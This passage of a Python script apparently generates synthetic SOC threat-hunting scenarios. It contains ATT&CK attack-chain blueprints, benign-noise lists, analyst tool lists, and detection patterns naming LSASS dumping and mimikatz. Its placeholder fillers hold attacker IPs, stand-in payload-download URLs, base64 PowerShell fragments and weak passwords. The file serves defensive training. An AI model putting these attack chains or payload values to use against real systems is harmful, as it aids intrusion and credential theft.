        "Logrotate running — file modification and compression in /var/log/ is scheduled",
        "NFS mount from backup server {jump_host} — nightly data protection job, expected SMB/NFS activity",
        "SSH key rotation script ran — new authorized_keys entry added as part of scheduled key management",
    ],
    "cloud": [
        "CloudTrail: describe-instances API call from legitimate DevOps pipeline (GitLab CI runner)",
        "Azure AD: service principal token refresh from CI/CD pipeline — expected OAuth token rotation",
        "S3 presigned URL generation for legitimate file transfer to partner organization",
        "Lambda cold start — unusual execution timing but function is part of approved ETL pipeline",
        "Terraform plan/apply run by DevOps — creating/modifying cloud resources via approved IaC workflow",
    ],
    "web": [
        "Search engine crawler (Googlebot) responsible for high GET request volume — valid User-Agent confirmed",
        "Scheduled penetration test window — WAF alerts expected; test team IP range is {src_ip}",
        "Load testing tool (k6) running against staging environment — high request volume from internal subnet",
        "CDN health check requests from {cdn_provider} edge nodes — standard availability probe pattern",
    ],
    "evasion_focused": [
        "IT admin ran PowerShell audit script with -ExecutionPolicy Bypass for diagnostic purposes — approved activity",
        "Vulnerability scanner (Tenable.sc) accessing registry keys for compliance check — expected on Tuesdays",
        "Software deployment tool (PDQ Deploy) creating scheduled tasks for patch installation — approved change",
    ],
    "insider_threat": [
        "User {username} accessed shared drive for quarterly report — normal for role; volume {n} files is elevated but not unprecedented",
        "Cloud storage sync client (OneDrive) running backup — expected for this user's workstation policy",
        "User cleared browser history — privacy action, not necessarily malicious without additional context",
    ],
    "cloud_realistic": [
        "Azure AD: conditional access policy evaluated — MFA challenge successfully completed by {username}",
        "AWS CloudTrail: GetCallerIdentity call from developer workstation — normal SDK usage",
        "Service principal used for CI/CD pipeline — token refresh within expected rotation window",
    ],
    "enterprise_realistic": [
        "IT helpdesk ran diagnostic script on {host} — PowerShell execution authorized under ticket #88234",
        "Network monitoring agent polling endpoints — SNMP/WMI queries from management server expected",
        "SOC analyst ran Sysinternals tools (autoruns.exe, procmon.exe) for baseline capture",
    ],
    "nation_state_realistic": [
        "Software update agent ({vendor} Update Service) ran scheduled check — signed binary, valid certificate",
        "WSUS patch distribution to endpoints — registry and file writes expected during patch cycle",
        "PKI certificate validation queries to OCSP server — expected background TLS traffic",
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# TOOL CALLS — analyst actions required to validate the hypothesis
# ─────────────────────────────────────────────────────────────────────────────

TOOL_CALLS: dict[str, list[dict]] = {
    "credential_access": [
        {"name": "siem_query_auth_events",
         "purpose": "Correlate all failed and successful authentication events across hosts to map credential abuse scope",
         "priority": "high"},
        {"name": "threat_intel_ip_lookup",
         "purpose": "Verify reputation and geolocation of source IP(s) involved in authentication anomalies",
         "priority": "medium"},
        {"name": "ad_group_membership_audit",
         "purpose": "Check for unauthorized privilege escalation via group membership changes post-compromise",
         "priority": "medium"},
    ],
    "execution": [
        {"name": "endpoint_process_tree",
         "purpose": "Retrieve full parent-child process chain to determine execution origin and injected payload",
         "priority": "high"},
        {"name": "siem_powershell_script_block_logs",
         "purpose": "Decode and retrieve PowerShell script block logging from affected hosts to see full payload",
         "priority": "high"},
        {"name": "memory_forensics_snapshot",
         "purpose": "Capture volatile memory for shellcode, injected modules, and in-memory payload analysis",
         "priority": "medium"},
    ],
    "persistence": [
        {"name": "autoruns_baseline_diff",
         "purpose": "Compare current autostart entries (scheduled tasks, run keys, services) against known-good baseline",
         "priority": "high"},
        {"name": "file_system_timeline",
         "purpose": "Build filesystem timeline around persistence creation time to correlate with other artifacts",
         "priority": "medium"},
        {"name": "registry_change_audit",
         "purpose": "Review recent writes to Run/RunOnce, Winlogon, and AppInit_DLLs registry paths",
         "priority": "medium"},
    ],
    "privilege_escalation": [
        {"name": "event_log_privilege_assignment",
         "purpose": "Query Event ID 4672 for unexpected special privilege assignment events on affected hosts",
         "priority": "high"},
        {"name": "lsass_handle_audit",
         "purpose": "Review Sysmon Event ID 10 for processes opening handles to lsass.exe with read access",
         "priority": "high"},
        {"name": "kerberos_ticket_analysis",
         "purpose": "Analyze TGT and TGS requests for Kerberoasting or golden/silver ticket anomalies",
         "priority": "medium"},
    ],
    "defense_evasion": [
        {"name": "edr_sensor_health_check",
         "purpose": "Verify EDR and AV sensor health across all affected endpoints — identify agent kill attempts",
         "priority": "high"},
        {"name": "event_log_gap_analysis",
         "purpose": "Identify event log gaps or clearing events (ID 1102/104) to reconstruct hidden timeline",
         "priority": "high"},
        {"name": "file_entropy_scanner",
         "purpose": "Scan for packed/encrypted files (entropy > 7.0) on endpoints to identify staged payloads",
         "priority": "medium"},
    ],
    "lateral_movement": [
        {"name": "network_east_west_analysis",
         "purpose": "Analyze internal traffic for unusual SMB/RDP/WinRM patterns between non-server hosts",
         "priority": "high"},
        {"name": "ad_logon_event_correlation",
         "purpose": "Correlate Event ID 4624/4648 across all hosts to map full lateral movement path",
         "priority": "high"},
        {"name": "endpoint_process_baseline_diff",
         "purpose": "Compare process running state across hosts in lateral movement path vs clean baseline",
         "priority": "medium"},
    ],
    "collection": [
        {"name": "dlp_file_access_audit",
         "purpose": "Query DLP logs for bulk sensitive file access or data classification policy violations",
         "priority": "high"},
        {"name": "file_system_timeline",
         "purpose": "Build filesystem timeline to identify all staged data locations and access patterns",
         "priority": "high"},
        {"name": "cloud_storage_access_log",
         "purpose": "Check cloud storage (M365, Google Workspace, Box) for unauthorized upload sessions",
         "priority": "medium"},
    ],
    "command_and_control": [
        {"name": "network_beaconing_analysis",
         "purpose": "Analyze outbound connections for periodic intervals, fixed packet sizes, and known C2 JA3 fingerprints",
         "priority": "high"},
        {"name": "dns_query_log_analysis",
         "purpose": "Inspect DNS logs for high-entropy queries, abnormal query volumes, and long TXT responses",
         "priority": "high"},
        {"name": "threat_intel_ioc_lookup",
         "purpose": "Check C2 IP, domain, and JA3 fingerprint against threat intelligence feeds",
         "priority": "medium"},
        {"name": "proxy_log_full_url_extraction",
         "purpose": "Extract full request URLs and payload sizes from proxy logs for C2 traffic characterization",
         "priority": "medium"},
    ],
    "exfiltration": [
        {"name": "netflow_volume_analysis",
         "purpose": "Quantify total data transferred and confirm destination — correlate with data staging timeline",
         "priority": "high"},
        {"name": "dlp_outbound_content_inspection",
         "purpose": "Confirm sensitive data content in exfiltrated transfers via DLP deep content inspection",
         "priority": "high"},
        {"name": "cloud_storage_upload_audit",
         "purpose": "Check cloud provider logs for unauthorized bulk upload sessions from compromised accounts",
         "priority": "medium"},
    ],
    "initial_access": [
        {"name": "web_application_log_analysis",
         "purpose": "Review WAF, web server, and application logs for exploit payloads and successful responses",
         "priority": "high"},
        {"name": "threat_intel_ip_lookup",
         "purpose": "Check attacker IP against known exploit infrastructure and threat actor attribution lists",
         "priority": "high"},
        {"name": "vulnerability_confirmation",
         "purpose": "Confirm exploitability of identified vulnerability in current application version",
         "priority": "medium"},
    ],
    "discovery": [
        {"name": "ldap_query_audit",
         "purpose": "Review LDAP queries from compromised host for AD enumeration and BloodHound collection",
         "priority": "high"},
        {"name": "network_scan_correlation",
         "purpose": "Correlate IDS scan alerts with process-level evidence on scanning host",
         "priority": "medium"},
    ],
    "impact": [
        {"name": "backup_integrity_verification",
         "purpose": "Verify last known-good backup integrity and confirm shadow copy availability before recovery",
         "priority": "high"},
        {"name": "encryption_scope_assessment",
         "purpose": "Enumerate all hosts and shares affected by encryption — quantify blast radius",
         "priority": "high"},
        {"name": "ransomware_sample_collection",
         "purpose": "Collect ransomware binary for sandbox analysis, family identification, and decryptor research",
         "priority": "medium"},
    ],
}


# ─────────────────────────────────────────────────────────────────────────────
# SCENARIO BLUEPRINTS  ·  each defines an ordered multi-tactic attack chain
# ─────────────────────────────────────────────────────────────────────────────

BLUEPRINTS = [
    {
        "id_prefix": "chain-spray-exec",
        "name": "Password Spray → PowerShell → Persistence → C2 → Lateral → Collection → Exfil",
        "environment": "Windows domain (AD + hybrid Azure AD)",
        "difficulty": "hard",
        "attack_complexity": "enterprise_realistic",
        "noise_env": "enterprise_realistic",
        "steps": [
            {"tactic": "credential_access",   "tid": "T1110.003", "name": "Password Spraying"},
            {"tactic": "execution",           "tid": "T1059.001", "name": "PowerShell"},
            {"tactic": "persistence",         "tid": "T1053.005", "name": "Scheduled Task"},
            {"tactic": "command_and_control", "tid": "T1071.001", "name": "HTTPS Beaconing"},
            {"tactic": "lateral_movement",    "tid": "T1021.002", "name": "SMB / Admin Shares"},
            {"tactic": "collection",          "tid": "T1560",     "name": "Archive Collected Data"},
            {"tactic": "exfiltration",        "tid": "T1041",     "name": "Exfiltration Over C2"},
        ],
        "hypotheses": [
            "Primary: Credential spraying granted domain foothold; encoded PowerShell delivered second-stage payload.",
            "Alternative: Credentials may have been phished or purchased externally — Azure AD anomaly suggests prior breach.",
            "C2 likely uses HTTPS with fallback DNS tunneling — dual-channel architecture is common in targeted intrusions.",
            "Data staging in world-readable directory indicates planned, not opportunistic, exfiltration.",
        ],
        "uncertainties": [
            "Initial access vector ambiguous — spraying vs reused external credentials not confirmed without proxy/email logs",
            "PowerShell payload content unknown — script block logging may not capture in-memory obfuscated execution",
            "Exfiltration volume unconfirmed — staging observed but transfer not directly seen in available netflow",
        ],
    },
    {
        "id_prefix": "chain-phish-macro",
        "name": "Spearphishing Attachment → Macro → Web Shell → Discovery → LSASS Dump → RDP Lateral",
        "environment": "Windows corporate network (no cloud)",
        "difficulty": "hard",
        "attack_complexity": "enterprise_realistic",
        "noise_env": "windows_ad",
        "steps": [
            {"tactic": "initial_access",    "tid": "T1566.001", "name": "Spearphishing Attachment"},
            {"tactic": "execution",         "tid": "T1059.001", "name": "Macro-spawned PowerShell"},
            {"tactic": "persistence",       "tid": "T1505.003", "name": "Web Shell"},
            {"tactic": "discovery",         "tid": "T1082",     "name": "System Information Discovery"},
            {"tactic": "credential_access", "tid": "T1003.001", "name": "LSASS Memory Dump"},
            {"tactic": "lateral_movement",  "tid": "T1021.001", "name": "Remote Desktop Protocol"},
        ],
        "hypotheses": [
            "Primary: Finance-targeted macro-enabled document led to PowerShell execution, which then established a persistent web shell allowing continued access.",
            "Alternative: Application vulnerability exploit rather than user-executed macro — document was a decoy enabling the real server-side attack.",
            "LSASS dump preceded RDP lateral movement — credential access was required before interactive login was achievable.",
            "Discovery step indicates manual operator activity before lateral movement — reconnaissance was conducted through system information gathering.",
        ],
        "uncertainties": [
            "Email delivery path unconfirmed — gateway logs may not retain attachment for forensic analysis",
            "LSASS dump method unconfirmed — procdump vs Mimikatz vs process injection require endpoint forensics",
            "Lateral movement destination scope unknown — may have spread to additional hosts not yet identified",
        ],
    },
    {
        "id_prefix": "chain-webapp-linux",
        "name": "Web App SQLi → Web Shell → SUID Privesc → Discovery → Archive → Alt-Protocol Exfil",
        "environment": "Linux web server + internal corporate network",
        "difficulty": "hard",
        "attack_complexity": "enterprise_realistic",
        "noise_env": "linux",
        "steps": [
            {"tactic": "initial_access",      "tid": "T1190",     "name": "Exploit Public-Facing Application"},
            {"tactic": "persistence",         "tid": "T1505.003", "name": "Web Shell"},
            {"tactic": "privilege_escalation","tid": "T1068",     "name": "Exploitation for Privilege Escalation"},
            {"tactic": "discovery",           "tid": "T1018",     "name": "Remote System Discovery"},
            {"tactic": "collection",          "tid": "T1560",     "name": "Archive Collected Data"},
            {"tactic": "exfiltration",        "tid": "T1048",     "name": "Exfiltration Over Alternative Protocol"},
        ],
        "hypotheses": [
            "Primary: SQL injection on public-facing login granted OS command execution, leading to web shell deployment for persistent access.",
            "Alternative: Authentication bypass via JWT manipulation rather than SQL injection — both result in the same web shell persistence path.",
            "SUID binary exploitation then provided root access, after which internal network discovery was conducted via nmap sweep.",
            "Alt-protocol exfil (FTP/SFTP/curl) was chosen subsequently to avoid the monitored HTTPS proxy egress channel.",
        ],
        "uncertainties": [
            "Exact vulnerability class requires WAF log + application source review — SQLi vs RCE vs auth bypass",
            "Privilege escalation vector ambiguous — multiple SUID binaries present; which one exploited is unknown",
            "Exfiltration destination requires threat intel — external IP reputation lookup needed",
        ],
    },
    {
        "id_prefix": "chain-ransomware",
        "name": "External RDP → Discovery → LSASS → Lateral → Disable Defenses → Recovery Kill → Encrypt",
        "environment": "Windows domain (SMB-heavy, mixed server/workstation)",
        "difficulty": "hard",
        "attack_complexity": "enterprise_realistic",
        "noise_env": "windows_ad",
        "steps": [
            {"tactic": "initial_access",    "tid": "T1133",     "name": "External Remote Services"},
            {"tactic": "discovery",         "tid": "T1018",     "name": "Remote System Discovery"},
            {"tactic": "credential_access", "tid": "T1003.001", "name": "LSASS Memory Dump"},
            {"tactic": "lateral_movement",  "tid": "T1021.002", "name": "SMB / Admin Shares"},
            {"tactic": "defense_evasion",   "tid": "T1562.001", "name": "Disable Security Tools"},
            {"tactic": "impact",            "tid": "T1490",     "name": "Inhibit System Recovery"},
            {"tactic": "impact",            "tid": "T1486",     "name": "Data Encrypted for Impact"},
        ],
        "hypotheses": [
            "Primary: Ransomware operator accessed exposed RDP, then conducted domain-wide credential harvest via LSASS, followed by disabling defenses before encryption.",
            "Alternative: Initial access via phishing leading to manual RDP lateral movement — a typical RaaS playbook variant resulting in the same encryption outcome.",
            "Shadow copy deletion indicates pre-ransomware preparation — attacker deliberately inhibited recovery before detonating encryption.",
            "Timeline of credential dump → lateral movement → AV disable → encryption indicates human operator cadence: hours between steps, not minutes.",
        ],
        "uncertainties": [
            "Ransomware family not yet identified — binary sample required for attribution and decryptor research",
            "Initial access dwell time unknown — earliest artifacts may predate detection by days or weeks",
            "Full encryption scope unconfirmed — network segmentation may have limited blast radius",
        ],
    },
    {
        "id_prefix": "chain-cloud-identity",
        "name": "Azure AD Legacy Auth Bypass → Account Discovery → Kerberoasting → Data Access → Cloud Exfil",
        "environment": "Azure AD + M365 + on-prem AD hybrid environment",
        "difficulty": "medium",
        "attack_complexity": "cloud_realistic",
        "noise_env": "cloud_realistic",
        "steps": [
            {"tactic": "initial_access",    "tid": "T1133",     "name": "External Remote Services (Azure AD)"},
            {"tactic": "discovery",         "tid": "T1087",     "name": "Account Discovery"},
            {"tactic": "credential_access", "tid": "T1558.003", "name": "Kerberoasting"},
            {"tactic": "collection",        "tid": "T1039",     "name": "Data from Network Shared Drive"},
            {"tactic": "exfiltration",      "tid": "T1567",     "name": "Exfiltration to Cloud Storage"},
        ],
        "hypotheses": [
            "Primary: Legacy authentication bypass allowed attacker to authenticate with stolen credentials, leading to account discovery and Kerberoasting for further credential access.",
            "Alternative: OAuth device code phishing bypassed MFA — token captured via malicious flow, enabling the same discovery and data access path.",
            "Kerberoasting targeted synced service accounts, resulting in RC4-hashable TGS tickets for offline cracking.",
            "Cloud storage exfiltration followed data collection — blends with legitimate OneDrive/SharePoint sync, making it difficult to detect without DLP.",
        ],
        "uncertainties": [
            "Whether MFA bypass exploited legacy protocol gap or conditional access misconfiguration requires AAD audit log review",
            "Kerberoasting success unconfirmed — ticket requests observed but offline cracking success not detected",
            "Volume and sensitivity of data accessed from SharePoint requires M365 DLP and audit log correlation",
        ],
    },
    {
        "id_prefix": "chain-lolbin-evasion",
        "name": "Phishing Link → LOLBin Execution → UAC Bypass → Credential Store → WinRM Lateral → Data Stage",
        "environment": "Windows enterprise (EDR-deployed, hardened)",
        "difficulty": "hard",
        "attack_complexity": "evasion_focused",
        "noise_env": "evasion_focused",
        "steps": [
            {"tactic": "initial_access",      "tid": "T1566.002", "name": "Spearphishing Link"},
            {"tactic": "execution",           "tid": "T1059.003", "name": "Windows Command Shell (LOLBin)"},
            {"tactic": "privilege_escalation","tid": "T1548.002", "name": "UAC Bypass via Registry Hijack"},
            {"tactic": "credential_access",   "tid": "T1555",     "name": "Credentials from Password Stores"},
            {"tactic": "lateral_movement",    "tid": "T1021.006", "name": "Windows Remote Management"},
            {"tactic": "collection",          "tid": "T1074",     "name": "Data Staged"},
        ],
        "hypotheses": [
            "Primary: Attacker used exclusively Windows built-in tools (LOLBins), enabling evasion of signature-based detection throughout the chain.",
            "Alternative: Some custom tooling masquerades as LOLBins — binary hash verification is required to distinguish, as the behaviors are similar.",
            "UAC bypass via registry hijack was required before credential store access — non-admin initial access necessitated elevation first.",
            "WinRM lateral movement was preferred over SMB subsequently, specifically to avoid common Admin share detection rules.",
        ],
        "uncertainties": [
            "Whether attack used pure LOLBins or custom tools requires binary hash verification against Microsoft WDAC catalog",
            "Credential store access scope ambiguous — browser, Windows Credential Manager, or both targeted",
            "WinRM lateral movement destination count unconfirmed — logs may be incomplete if WinRM logging not enforced",
        ],
    },
    {
        "id_prefix": "chain-insider-threat",
        "name": "Insider: Bulk Share Access → Archive → Event Log Clear → Cloud Exfil",
        "environment": "Windows corporate + cloud storage (M365/OneDrive)",
        "difficulty": "medium",
        "attack_complexity": "insider_threat",
        "noise_env": "insider_threat",
        "steps": [
            {"tactic": "collection",       "tid": "T1039",     "name": "Data from Network Shared Drive"},
            {"tactic": "collection",       "tid": "T1560",     "name": "Archive Collected Data"},
            {"tactic": "defense_evasion",  "tid": "T1070.001", "name": "Clear Windows Event Logs"},
            {"tactic": "exfiltration",     "tid": "T1567",     "name": "Exfiltration to Cloud Storage"},
        ],
        "hypotheses": [
            "Primary: Authorized user deliberately staged and exfiltrated sensitive data — event log clearing after collection indicates insider awareness of detection methods.",
            "Alternative: Compromised legitimate account used by external attacker mimicking insider behavior, leading to the same observable pattern.",
            "Event log clearing strongly suggests deliberate cover-up — characteristic of an insider who understands security monitoring, then proceeded to cloud exfil.",
            "Cloud storage exfiltration via personal account was chosen specifically to avoid corporate DLP monitoring on managed devices.",
        ],
        "uncertainties": [
            "Cannot distinguish malicious insider from compromised legitimate account without user behavioral baseline and UEBA",
            "Full scope of data accessed is unknown — file server audit logging may not capture all share access",
            "Whether exfiltration was pre-planned (IP theft) or opportunistic requires communication and HR records review",
        ],
    },
    {
        "id_prefix": "chain-apt-supply-chain",
        "name": "Supply Chain Compromise → Obfuscated Payload → Domain Admin → Registry Persistence → DNS C2",
        "environment": "Windows enterprise (trusted software supply chain)",
        "difficulty": "hard",
        "attack_complexity": "nation_state_realistic",
        "noise_env": "nation_state_realistic",
        "steps": [
            {"tactic": "initial_access",    "tid": "T1195.002", "name": "Supply Chain Compromise"},
            {"tactic": "defense_evasion",   "tid": "T1027",     "name": "Obfuscated Files/Information"},
            {"tactic": "privilege_escalation","tid": "T1078.002","name": "Domain Account Abuse"},
            {"tactic": "persistence",       "tid": "T1547.001", "name": "Registry Run Keys"},
            {"tactic": "command_and_control","tid": "T1071.004", "name": "DNS Application Layer C2"},
        ],
        "hypotheses": [
            "Primary: Trojanized signed software update delivered malicious DLL via the trusted pipeline, enabling persistence through registry keys and subsequent DNS C2 establishment.",
            "Alternative: Developer machine compromised rather than distribution infrastructure — code injection at build time leading to the same signed binary outcome.",
            "Domain admin credential abuse indicates the attacker had pre-existing domain intelligence before payload detonation — prior reconnaissance through the trusted channel.",
            "DNS C2 was selected specifically to blend with legitimate corporate DNS resolution — low volume queries resulting in long dwell time before detection.",
        ],
        "uncertainties": [
            "Supply chain compromise entry point unknown — requires vendor forensics and build pipeline audit",
            "Whether domain escalation achieved DCSync rights or only interactive admin access requires SIEM correlation",
            "DNS C2 scope and data volume requires deep packet inspection — encrypted DNS hides full channel content",
        ],
    },
    {
        "id_prefix": "chain-recon-to-exploit",
        "name": "Port Scan → Vuln Scan → Web App Exploit → Reverse Shell → Privilege Escalation → Exfil",
        "environment": "Internet-facing Linux server (DMZ)",
        "difficulty": "medium",
        "attack_complexity": "enterprise_realistic",
        "noise_env": "web",
        "steps": [
            {"tactic": "reconnaissance",      "tid": "T1595.001", "name": "Active Scanning: Port Scan"},
            {"tactic": "reconnaissance",      "tid": "T1595.002", "name": "Active Scanning: Vulnerability Scan"},
            {"tactic": "initial_access",      "tid": "T1190",     "name": "Exploit Public-Facing Application"},
            {"tactic": "execution",           "tid": "T1059.004", "name": "Unix Shell Reverse Shell"},
            {"tactic": "privilege_escalation","tid": "T1068",     "name": "Privilege Escalation via SUID/Exploit"},
            {"tactic": "exfiltration",        "tid": "T1048",     "name": "Exfiltration Over Alternative Protocol"},
        ],
        "hypotheses": [
            "Primary: Attacker conducted systematic port scanning then vulnerability scanning, leading to identification and exploitation of the web application.",
            "Alternative: Reconnaissance data obtained from Shodan/certificate logs — no active scanning required, providing the same intelligence prior to exploit.",
            "SQLi or command injection on web app then allowed reverse shell establishment, followed by SUID exploitation for root access.",
            "Alt-protocol exfil via curl/FTP was chosen subsequently to avoid the monitored HTTPS channel — outbound firewall policy determines which protocol was used.",
        ],
        "uncertainties": [
            "Whether port scan and web exploit are same actor requires IP correlation — different IPs could indicate relay/proxy use",
            "Exact web vulnerability class requires application code and WAF rule analysis",
            "Exfiltration protocol and destination unconfirmed — firewall egress policy may reveal or block alt-protocol channels",
        ],
    },
    {
        "id_prefix": "chain-pentest-style",
        "name": "External Foothold → Internal Recon → Lateral Movement → Domain Escalation → Data Access",
        "environment": "Windows enterprise + cloud (AD + Azure hybrid)",
        "difficulty": "hard",
        "attack_complexity": "enterprise_realistic",
        "noise_env": "windows_ad",
        "steps": [
            {"tactic": "initial_access",      "tid": "T1133",     "name": "External Remote Services"},
            {"tactic": "discovery",           "tid": "T1018",     "name": "Remote System Discovery"},
            {"tactic": "credential_access",   "tid": "T1558.003", "name": "Kerberoasting"},
            {"tactic": "lateral_movement",    "tid": "T1550.002", "name": "Pass the Hash"},
            {"tactic": "privilege_escalation","tid": "T1078.002", "name": "Domain Admin Account"},
            {"tactic": "collection",          "tid": "T1039",     "name": "Data from Network Shared Drive"},
        ],
        "hypotheses": [
            "Primary: Attacker gained foothold via exposed external service, then conducted methodical lateral movement resulting in domain admin access.",
            "Alternative: Supply chain or trusted third-party access provided direct internal foothold — leading to the same lateral movement path without external service exploitation.",
            "Kerberoasting resulted in cracked credentials which enabled pass-the-hash lateral movement, then allowing domain admin escalation.",
            "Domain admin acquisition followed by bulk share access indicates data theft objective — collection preceded exfiltration but transfer not yet observed.",
        ],
        "uncertainties": [
            "Whether Kerberoasting resulted in cracked credentials or attacker used other means for PTH is unclear",
            "Domain admin escalation path requires AD audit logs — multiple paths possible (DCSync, delegation abuse, group change)",
            "Data exfiltration not confirmed — collection observed but no outbound transfer detected yet",
        ],
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# PLACEHOLDER FILLERS — randomized realistic values for signal templates
# ─────────────────────────────────────────────────────────────────────────────

FILLERS: dict[str, list[str]] = {
    "{src_ip}":          ["185.193.127.4", "91.234.56.12", "45.77.100.23", "103.85.22.17", "195.54.162.88", "46.166.176.123"],
    "{target_subnet}":   ["10.0.1.0/24", "192.168.10.0/24", "172.16.5.0/24", "10.10.20.0/24"],
    "{target_domain}":   ["corp.contoso.com", "internal.acme.local", "ad.megacorp.net", "domain.enterprise.io"],
    "{suspicious_domain}": ["update-svc.net", "cdn-delivery.io", "telemetry-api.com", "svc-monitor.biz"],
    "{phish_domain}":    ["corp0nline.com", "login-secure-corp.net", "account-verify.biz", "m1crosoft-auth.com"],
    "{anomalous_geo}":   ["Belarus", "North Korea", "Russia", "Iran", "China", "Ukraine"],
    "{username}":        ["j.smith", "admin_svc", "helpdesk01", "svc_backup", "j.doe", "m.johnson", "svc_monitor"],
    "{admin_account}":   ["domadmin", "svc_domain", "administrator", "corp\\admin", "da_ops"],
    "{b64_payload}":     [
        "JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAA...",
        "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBuAGMA...",
    ],
    "{url}":             [
        "http://185.193.127.4/stage2.ps1",
        "https://cdn-delivery.io/update.ps1",
        "http://45.77.100.23/payload.bin",
    ],
    "{parent}":          ["winword.exe", "excel.exe", "outlook.exe", "mshta.exe", "explorer.exe"],
    "{host}":            ["WS-23", "WS-47", "LAPTOP-08", "DESKTOP-QZ1", "DEV-BOX-02", "WRK-FINANCE-01"],
    "{src_host}":        ["WS-23", "WS-47", "LAPTOP-08", "DESKTOP-QZ1"],
    "{dst_host}":        ["DC01", "FS-01", "APP-SRV-02", "BACKUP-01", "SQLSRV-01", "EXCH-01"],
    "{jump_host}":       ["JUMP-SRV-01", "bastion.corp.local", "PAM-GW-01"],
    "{n}":               ["15", "23", "47", "8", "31", "52", "12"],
    "{c2_ip}":           ["185.193.127.4", "91.234.56.12", "45.77.100.23", "46.166.176.123"],
    "{domain}":          ["update-svc.net", "cdn-delivery.io", "telemetry-api.com"],
    "{entropy_domain}":  [
        "a3jf82k.update-svc.net",
        "xq92bf0.cdn-delivery.io",
        "p8r2kqm.telemetry-api.com",
        "b7fxq1r2.svc-monitor.biz",
    ],
    "{port}":            ["4444", "8080", "9001", "1337", "6666"],
    "{attacker_ip}":     ["185.193.127.4", "91.234.56.12", "46.166.176.123"],
    "{source_process}":  ["explorer.exe", "svchost.exe", "chrome.exe", "mshta.exe", "winword.exe"],
    "{target_process}":  ["lsass.exe", "winlogon.exe", "explorer.exe"],
    "{spn}":             [
        "MSSQLSvc/SQLSRV-01.corp.local:1433",
        "HTTP/webserver.corp.local",
        "cifs/FS-01.corp.local",
        "MSSQLSvc/BACKUP-01.corp.local:1433",
    ],
    "{filename}":        ["update.exe", "svchost32.exe", "winlogon64.dll", "chrome_update.msi", "helper.dll"],
    "{user}":            ["j.smith", "svc_backup", "helpdesk01", "m.johnson"],
    "{account}":         ["support_temp", "svc_monitor2", "backdoor_usr", "audit_svc"],
    "{password}":        ["P@ssw0rd123", "Summer2024!", "Backup#2024", "Winter2025!"],
    "{cloud_provider}":  ["Mega.nz", "Google Drive", "Dropbox", "AWS S3", "OneDrive personal"],
    "{cdn_provider}":    ["Cloudflare", "Fastly", "Akamai"],
    "{vendor}":          ["SoftCorp Inc.", "UpdatePro LLC", "EnterpriseSuite", "NetAgent Corp"],
}


def fill(text: str, rng: random.Random) -> str:
    """Replace all {placeholder} tokens with randomized realistic values."""
    for key, options in FILLERS.items():
        if key in text:
            text = text.replace(key, rng.choice(options))
    return text


def pick_signals(tid: str, n: int, rng: random.Random) -> list[str]:
    pool = SIGNAL_POOL.get(tid, [])
    if not pool:
        return [f"Anomalous system activity consistent with {tid} — insufficient telemetry for precise attribution"]
    chosen = rng.sample(pool, min(n, len(pool)))
    return [fill(s, rng) for s in chosen]


def get_competing(tid: str, override: list | None, rng: random.Random) -> list[dict]:
    if override:
        return override
    options = COMPETING.get(tid, DEFAULT_COMPETING)
    # Shuffle order so training data doesn't always see same alternative first
    shuffled = options[:]
    rng.shuffle(shuffled)
    return shuffled


def pick_noise(env: str, n: int, rng: random.Random) -> list[str]:
    pool = NOISE.get(env, NOISE["windows_ad"])
    chosen = rng.sample(pool, min(n, len(pool)))
    return [fill(s, rng) for s in chosen]


def get_tool_calls(tactics: list[str]) -> list[dict]:
    seen: set[str] = set()
    calls: list[dict] = []
    for tactic in tactics:
        for call in TOOL_CALLS.get(tactic, []):
            if call["name"] not in seen:
                seen.add(call["name"])
                calls.append(copy.deepcopy(call))
    # Prioritize high-priority calls, cap at 5
    calls.sort(key=lambda x: 0 if x["priority"] == "high" else 1)
    return calls[:5]


def step_confidence(n_visible: int, n_total: int, rng: random.Random) -> float:
    base = 0.45 + (n_visible / max(n_total, 1)) * 0.45
    jitter = rng.uniform(-0.06, 0.06)
    return round(min(0.95, max(0.40, base + jitter)), 2)


def build_detection(steps: list[dict]) -> dict:
    tactic_patterns = {
        "reconnaissance":      ["Active port or vulnerability scanning from external IP"],
        "initial_access":      ["Web application exploit signature in HTTP request body or timing", "External auth from anomalous geolocation or device"],
        "execution":           ["Encoded or obfuscated command execution from unusual parent process", "Office application spawning shell process"],
        "persistence":         ["New scheduled task or registry run key created outside change window", "Web server writing new script file outside deployment pipeline"],
        "privilege_escalation":["Privilege escalation event sequence (e.g., SeDebugPrivilege assignment)", "LSASS handle opened by non-system process"],
        "defense_evasion":     ["Security tool disabled or AV real-time protection turned off", "Event log cleared or gap detected in event timeline"],
        "credential_access":   ["Auth anomaly: burst of failures followed by success across multiple accounts", "LSASS memory access by non-security process"],
        "discovery":           ["Internal subnet scan initiated from endpoint", "LDAP enumeration queries for privileged objects from non-DC"],
        "lateral_movement":    ["East-west SMB/RDP/WinRM traffic between non-server hosts", "Pass-the-hash or pass-the-ticket NTLM authentication pattern"],
        "collection":          ["Bulk file access or archiving in staging path", "Mass read operations on shared drives outside business hours"],
        "command_and_control": ["Periodic outbound connection with fixed interval — beaconing pattern", "High-entropy DNS queries or abnormal query volume to single domain"],
        "exfiltration":        ["Large outbound data transfer spike to unknown external destination", "Cloud storage upload via non-corporate client or account"],
        "impact":              ["Shadow copy or backup deletion command executed", "Mass file rename or extension change (encryption indicator)"],
    }
    tactic_rules = {
        "reconnaissance":      ["Alert on port scan signatures (SYN flood, sequential IP sweep) from external IPs", "Monitor for web vulnerability scanner User-Agent strings and path enumeration"],
        "initial_access":      ["WAF: alert on SQLi/XSS/RCE patterns with 2xx response", "Alert on successful external auth from new country/device"],
        "execution":           ["Alert on Office applications spawning shell processes (cmd.exe, powershell.exe)", "Alert on PowerShell with -enc/-nop/-w hidden flags from non-admin context"],
        "persistence":         ["Monitor scheduled task creation by non-admin accounts (Event ID 4698)", "Alert on new registry Run key entries not matching software deployment baseline"],
        "privilege_escalation":["Event ID 4672: alert on unexpected SeDebugPrivilege assignment", "Alert on LSASS handle access from processes outside EDR/AV allowlist"],
        "defense_evasion":     ["Event ID 1102/104: alert on audit log clearing", "Alert on Windows Defender or EDR service stop outside maintenance window"],
        "credential_access":   ["Correlation rule: N failed logins across M accounts from single IP within T minutes", "Alert on procdump/mimikatz process signature or LSASS handle access"],
        "discovery":           ["Alert on internal LDAP queries for adminCount=1 users from non-DC host", "Detect internal nmap/arp/net view sweep from endpoint"],
